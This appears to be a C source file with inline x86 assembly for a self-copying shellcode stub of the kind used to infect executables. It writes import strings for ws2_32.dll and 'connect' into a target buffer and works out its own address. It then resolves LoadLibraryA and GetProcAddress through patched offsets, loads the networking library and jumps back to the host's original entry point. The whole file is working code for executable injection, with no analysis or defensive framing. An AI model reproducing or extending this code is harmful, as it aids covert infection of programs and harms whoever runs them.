#include <stdint.h>

#define GET_PARAM_(f) PARAM_ ## f : mov eax, 1337; 

#define PAYLOAD_HEAP_SIZE 0x500

/*

param1 - absolute offset to original entry point
param2 - absolute offset to LoadLibraryA
param3 - absolute offset to GetProcAddress

access params via GET_PARAM_(1) , GET_PARAM_(2) ...
*/
int32_t SelfCopyingFunction(uint8_t* dst, 
							uint32_t param1, uint32_t param2, uint32_t param3)
{
	uint8_t* payLoad;
	uint32_t payLoad_length;


#define IMPORT_DLL			"ws2_32.dll"
#define IMPORT_DLL_LEN		16
#define IMPORT_DLL_OFFSET	0

	memcpy(dst+IMPORT_DLL_OFFSET, IMPORT_DLL, IMPORT_DLL_LEN);

#define IMPORT_F_1			"connect"
#define IMPORT_F_1_LEN		16
#define IMPORT_F_1_OFFSET	(IMPORT_DLL_OFFSET+IMPORT_DLL_LEN)

	memcpy(dst+IMPORT_F_1_OFFSET, IMPORT_F_1, IMPORT_F_1_LEN);

	_asm
	{
		jmp end;
start:
		GET_PARAM_(1)		;
		mov edx, eax		;
		call foo
foo:
		pop ebx				;	get adress of foo
		mov ecx, foo		;
		sub ecx, start		;		
		sub ebx, ecx		;	calc addr of start
		mov [ebx-8], ebx	;	 store start addr on pseudo stack

		mov [ebx-12], ebx	;	 store start addr on pseudo stack
		sub [ebx-12], edx	;	calc addr of original entry point store original entry point addr

		;LoadLibraryA
		GET_PARAM_(2)		;	
		mov edx, [ebx-8]	;
		sub edx, eax		;
		mov edx, [edx]		;	dereference pointer
		mov [ebx-16], edx   ;	store addr of LoadLibraryA

		;GetProcAddress
		GET_PARAM_(3)		;	
		mov edx, [ebx-8]	;
		sub edx, eax		;
		mov edx, [edx]		;	dereference pointer
		mov [ebx-20], edx   ;	store addr to pointer of GetProcAddress

		;;;;;;;;;;;;;
		; payload
		
		mov eax, ebx		;
		sub eax, PAYLOAD_HEAP_SIZE-IMPORT_DLL_OFFSET;
		push eax			;	push param1 of LoadLibraryAS
		call [ebx-16]			; call LoadLibrary


		mov ecx, ebx		;
		sub ecx, PAYLOAD_HEAP_SIZE-IMPORT_F_1_OFFSET;
		push ecx			;	push param1 of LoadLibraryAS
		push eax			; param 2 handler
		call [ebx-20]		; call GetProcAddress

		;;;;;;;;;;;;;
		jmp [ebx-12]				

end:
		// calc payload length
		mov eax, end;
		sub eax, start;
		mov payLoad_length, eax;
		mov eax, start;
		mov payLoad, eax;

		// PRE PROCESSOR LOOP:
		mov eax, param1;
		mov PARAM_1+1, eax;

		mov eax, param2;
		mov PARAM_2+1, eax;

		mov eax, param3;
		mov PARAM_3+1, eax;

	};


	memcpy(dst + PAYLOAD_HEAP_SIZE, payLoad, payLoad_length);

	return 1337;
}